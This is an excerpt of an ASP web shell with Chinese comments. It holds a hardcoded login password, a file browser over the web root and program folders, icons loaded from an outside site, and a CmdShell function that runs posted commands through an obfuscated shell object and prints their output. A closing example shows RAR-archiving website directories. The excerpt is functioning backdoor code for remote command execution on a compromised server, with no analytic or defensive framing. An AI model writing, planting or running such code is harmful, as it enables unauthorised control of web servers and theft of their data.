...
ApplicationName = "柳州"                         '#####程序名称/标题
UserPass        = "qinwen"                               '#####初始登录密码   
ShowFileIco     = True                                     '#####是否显示图标,False为用文字图标
IcoPath         = "http://xgang.zj.com/zhusou/"   '#####图标目录,不必修改
...
Function MainMenu()
  ...
  SI=SI&"<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>WEB根目录</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI& IsIco("minus.gif","folder.gif","0")
  SI=SI&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>程序目录</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  ...
  SI=SI&"<a href='http://www.zxar.org' target='_blank'>知心爱人</a>"
  SI=SI&"</td></tr></table>"
  Response.Write SI : SI=""
End Function
...
Function CmdShell()
  ...
  SI=SI&"<textarea readonly  Style='width:100%;height:500;' class='cmd'>"
  If Request.Form("cmd")<>"" Then SI=SI&CreateObject(ObT(1,0)).exec(ShellPath&" /c "&DefCmd).stdout.readall
  SI=SI&Chr(13)&Chr(13)&Chr(13)&"Rar命令行压缩示例：c:\progra~1\winrar\rar.exe a d:\web\test\web1.rar d:\web\test\web1</textarea>"
